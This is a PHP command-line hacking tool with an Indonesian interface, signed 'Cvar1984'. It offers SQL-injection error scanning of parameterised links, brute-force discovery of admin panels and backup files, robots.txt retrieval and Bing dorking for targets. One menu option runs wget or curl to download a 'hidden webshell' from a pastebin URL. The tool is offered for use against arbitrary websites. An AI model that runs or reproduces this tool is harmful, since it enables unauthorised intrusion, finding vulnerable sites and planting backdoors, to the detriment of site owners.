<?php
error_reporting(0);
@ini_set('memory_limit', '64M');
@header('Content-Type: text/html; charset=UTF-8');
if(strtolower(substr(PHP_OS,0,3))=="win"){
	$bersih="cls";
	$download="curl --output ini.php https://pastebin.com/raw/XsHL7qxq";
}else {
	$download="wget -O ini.php https://pastebin.com/raw/XsHL7qxq";
	$bersih="clear";
}
function userinput($message){
	global $white, $bold, $greenbg, $redbg, $bluebg, $cln, $lblue, $green;
	$inputstyle = $cln . $bold . $lblue . "[#] " . $message . " => " . $green ;
	echo $inputstyle;
}
function gethttpheader($reallink){
	  $hdr=get_headers($reallink);
	  foreach($hdr as $shdr) {
		  echo "\n\e[92m\e[1m[i]\e[0m  $shdr";
  }echo "\n";
}
function robots($reallink){
  $rbturl    = $reallink . "/robots.txt";
  $rbthandle = curl_init($rbturl);
  curl_setopt($rbthandle, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($rbthandle, CURLOPT_RETURNTRANSFER, TRUE);
  $rbtresponse = curl_exec($rbthandle);
  $rbthttpCode = curl_getinfo($rbthandle, CURLINFO_HTTP_CODE);
  if ($rbthttpCode == 200) {
      $rbtcontent = readcontents($rbturl);
      if ($rbtcontent == ""){
          echo "200 tapi null!";
        }else {
          echo "\e[92mFound \e[0m\n";
          echo "$white\n=========================== isi ===========================\n";
          echo $rbtcontent;
          echo "$white\n=========================== isi ===========================";
        }
    }else {
      echo "\e[91m 404 not found \e[0m\n";
   }
}
function getsource($url, $proxy) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    if ($proxy) {
        $proxy = explode(':', autoprox());
        curl_setopt($curl, CURLOPT_PROXY, $proxy[0]);
        curl_setopt($curl, CURLOPT_PROXYPORT, $proxy[1]);
    }
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
$white = "\e[97m";
$yellow = "\e[93m";
$blue   = "\e[34m";
$lblue  = "\e[36m";
$cln    = "\e[0m";
$green  = "\e[92m";
$red    = "\e[91m";
$bluebg = "\e[44m";
$lbluebg = "\e[106m";
$greenbg = "\e[42m";
$lgreenbg = "\e[102m";
$yellowbg = "\e[43m";
$lyellowbg = "\e[103m";
$redbg = "\e[101m";
$bold   = "\e[1m";
system("$bersih");
function asciiart() {
echo " 
   ___    ___      _                ___                           
  / __|  / _ \    | |       o O O  / __|    __     __ _    _ _    
  \__ \ | (_) |   | |__    o       \__ \   / _|   / _` |  | ' \   
  |___/  \__\_\   |____|  TS__[O]  |___/   \__|_  \__,_|  |_||_|  
\n";
}
asciiart();
echo "$yellow=========================== Cvar1984 ===========================\n";
Cvar1984:
echo "\n";
userinput("Web yg ingin di scan");
$ip = trim(fgets(STDIN, 1024));
if (strpos($ip, '://') !== false) {
    echo $bold . $red . "\n[!] HTTP / HTTPS Ter Deteksi, input URL tanpa HTTP / HTTPS [!]\n" . $CURLOPT_RETURNTRANSFER;
    goto Cvar1984;
  }elseif (strpos($ip, '.') == false) {
    echo $bold . $red . "\n[!] URL Format false [!] \n" . $cln;
    goto Cvar1984;
  }elseif (strpos($ip, ' ') !== false) {
    echo $bold . $red . "\n[!] URL Format false [!] \n" . $cln;
    goto Cvar1984;
  }else {
        $ipsl = "http://";
      }
	  aksi:
	  system("$bersih");
	  asciiart();
	  echo "$yellow=========================== Cvar1984 ===========================\n";
	  echo "$white [1] SQL Error Page ( Cari Pages Vuln Sql )\n";
	  echo "$white [2] Admin Finder ( Cari Pages Login Admin )\n";
	  echo "$white [3] Robots.txt ( Caritau Isi Robots.txt )\n";
	  echo "$white [4] Bing Dorker ( Dorking Anything )\n";
	  echo "$white [5] Download Hidden Webshell ( output=ini.php )\n";
	  echo "$green [B] Back ( Ganti Target )\n";
	  echo "$red [Q]  Quit!\n";
	  echo "$yellow=========================== Cvar1984 ===========================\n";
    userinput("Pilih Aksi Pada List");
    $pilih = trim(fgets(STDIN, 1024));
    if (!in_array($pilih, array('1','2','3','4','5','B','Q','b','q',), true)) {
        echo $bold . $red . "\n[!] Input false [!] \n\n" . $cln;
        goto aksi;
      }else {
		  if($pilih == "4") { 
userinput("Masukan Dork");
$dork=trim(fgets(STDIN,1024));
$do=urlencode($dork);
        $npage = 1;
        $npages = 30000;
        $allLinks = array();
        $lll = array();
        while($npage <= $npages) {
            $x = getsource("http://www.bing.com/search?q=".$do."&first=" . $npage."&FORM=PERE4", $proxy);
            if ($x) {
                preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
                foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
                $npage = $npage + 10;
                if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
            } else break;
        }
        $URLs = array();
        foreach($allLinks as $url){
            $exp = explode("/", $url);
            $URLs[] = $exp[2];
        }
        $array = array_filter($URLs);
        $array = array_unique($array);
        $sss=count(array_unique($array));
        foreach ($array as $domain) {
 
            echo"\n$red http://".$domain.'/';
			    echo "\n$green [!] Scanning Sukses. Tekan Enter untuk lanjut [!]\n";
            trim(fgets(STDIN, 1024));
			goto aksi;
        }
	}elseif($pilih == "3") {
            $reallink = $ipsl . $ip;
            $lwwww    = str_replace("www.", "", $ip);
            echo $blue . $bold . "[i] Scanning :\e[92m $ipsl" . "$ip \n";
            echo $bold . $yellow . "[S] Scan Tipe : Robots.txt" . $cln;
            echo "\n\n";
            echo $lblue . $bold . "[i] Robots File:$cln ";
            robots($reallink);
            echo "\n\n";
            echo "$green [!] Scanning Sukses. Tekan Enter untuk lanjut [!]\n";
            trim(fgets(STDIN, 1024));
            goto aksi;
          }elseif ($pilih == "5") {
			  echo "\n\n";
			  system("$download");
			   echo "$green [!] Tekan Enter untuk lanjut [!]";
            trim(fgets(STDIN, 1024));
			goto aksi;
		  }elseif ($pilih == 'q' | $pilih == 'Q') {
            die();
          }elseif ($pilih == 'b' || $pilih == 'B') {
            system("$bersih");
            goto Cvar1984;
          }elseif ($pilih == "2") {
            echo $blue . $bold . "[i] Scanning :\e[92m $ipsl" . "$ip \n";
            echo $bold . $yellow . "[S] Scan Tipe : Admin Panel Finder" . $cln;
            echo "\n\n";
            echo $bold . $blue . "\n[i] Loading Crawler File ....\n" . $cln;
            if (file_exists("admin.ini")) {
                echo $bold . $green . "\n [i] 200 admin.ini! Scanning  Admin Pannel [i]\n" . $cln;
                $crawllnk = file_get_contents("admin.ini");
                $crawls   = explode(',', $crawllnk);
                echo "\n URLs Loaded : " . count($crawls) . "\n\n";
                foreach ($crawls as $crawl) {
                    $url    = $ipsl . $ip . "/" . $crawl;
                    $handle = curl_init($url);
                    curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE);
                    $response = curl_exec($handle);
                    $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE);
                    if ($httpCode == 200) {
                        echo $bold . $lblue . "\n\n[URL] $url : " . $cln;
                        echo $bold . $green . "Found!" . $cln;
                      }elseif ($httpCode == 404) {
                      }else {
                        echo $bold . $lblue . "\n\n[URL] $url : " . $cln;
                        echo $bold . $yellow . "HTTP Response : " . $httpCode . $cln;
                      }
                    curl_close($handle);
                  }
              }else {
                echo "\n 404 File Not Found, Aborting Scan ....\n";
              }
            if (file_exists("backup.ini")) {
                echo "\n[!] 200 Backup Crawler File ! Scanning Situs Backups [!]\n";
                $crawllnk = file_get_contents("backup.ini");
                $crawls   = explode(',', $crawllnk);
                echo "\n URLs Loaded: " . count($crawls) . "\n\n";
                foreach ($crawls as $crawl)
                  {
                    $url    = $ipsl . $ip . "/" . $crawl;
                    $handle = curl_init($url);
                    curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE);
                    $response = curl_exec($handle);
                    $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE);
                    if ($httpCode == 200) {
                        echo $bold . $lblue . "\n\n[URL] $url : " . $cln;
                        echo $bold . $green . "Found!" . $cln;
                      }elseif ($httpCode == 404) {
                      }else {
                        echo $bold . $lblue . "\n\n[URL] $url : " . $cln;
                        echo $bold . $yellow . "HTTP Response : " . $httpCode . $cln;
                      }
                    curl_close($handle);
                  }
              }else {
                echo "\n 404 File Not Found, Aborting Admin Finder ....\n";
              }if (file_exists("others.ini")) {
                echo "\n[!] 200 General Crawler File Found! Scanning The Site [!]\n";
                $crawllnk = file_get_contents("others.ini");
                $crawls   = explode(',', $crawllnk);
                echo "\n URLs Loaded: " . count($crawls) . "\n\n";
                foreach ($crawls as $crawl) {
                    $url    = $ipsl . $ip . "/" . $crawl;
                    $handle = curl_init($url);
                    curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE);
                    $response = curl_exec($handle);
                    $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE);
                    if ($httpCode == 200) {
                        echo $bold . $lblue . "\n\n[URL] $url : " . $cln;
                        echo $bold . $green . "Found!" . $cln;
                      }elseif ($httpCode == 404) {
                      }else {
                        echo $bold . $lblue . "\n\n[URL] $url : " . $cln;
                        echo $bold . $yellow . "HTTP Response: " . $httpCode . $cln;
                      }curl_close($handle);
                  }
              }else {
                echo "\n 404 File Not Found, Aborting Scan ....\n";
              }
          }elseif ($pilih == "1") {
            $reallink = $ipsl . $ip;
            $srccd    = file_get_contents($reallink);
            $lwwww    = str_replace("www.", "", $ip);
            echo $blue . $bold . "[i] Scanning :\e[92m $ipsl" . "$ip \n";
            echo $bold . $yellow . "[*] Tipe Scan : SQL Error Page" . $cln;
            echo "\n\n";
            $lulzurl = $reallink;
            $html    = file_get_contents($lulzurl);
            $dom     = new DOMDocument;
            @$dom->loadHTML($html);
            $links = $dom->getElementsByTagName('a');
            $vlnk  = 0;
            foreach ($links as $link) {
                $lol = $link->getAttribute('href');
                if (strpos($lol, '?') !== false) {
                    echo $lblue . $bold . "\n[#] " . $yellow . $lol . "\n" . $cln;
                    echo $blue . $bold . "[!] ";
                    $sqllist = file_get_contents('sqlerrors.ini');
                    $sqlist  = explode(',', $sqllist);
                    if (strpos($lol, '://') !== false) {
                        $sqlurl = $lol . "'";
                      }else {
                        $sqlurl = $ipsl . $ip . "/" . $lol . "'";
                      }
                    $sqlsc = file_get_contents($sqlurl);
                    $sqlvn = $bold . $red . "Gak Vulnerable";
                    foreach ($sqlist as $sqli) {
                        if (strpos($sqlsc, $sqli) !== false)
                            $sqlvn = $green . $bold . "Vulnerable!!";
                      }
                    echo $sqlvn;
                    echo "\n$cln";
                    echo "\n";
                    $vlnk++;
                  }
              }
            echo "\n" . $blue . $bold . "[!] Scanning : " . $green . $vlnk;
            echo "\n\n";
            echo "$green [!] Scanning Sukses. Tekan Enter untuk lanjut [!]";
            trim(fgets(STDIN, 1024));
            goto aksi;
          }else goto aksi;
	  }
?>
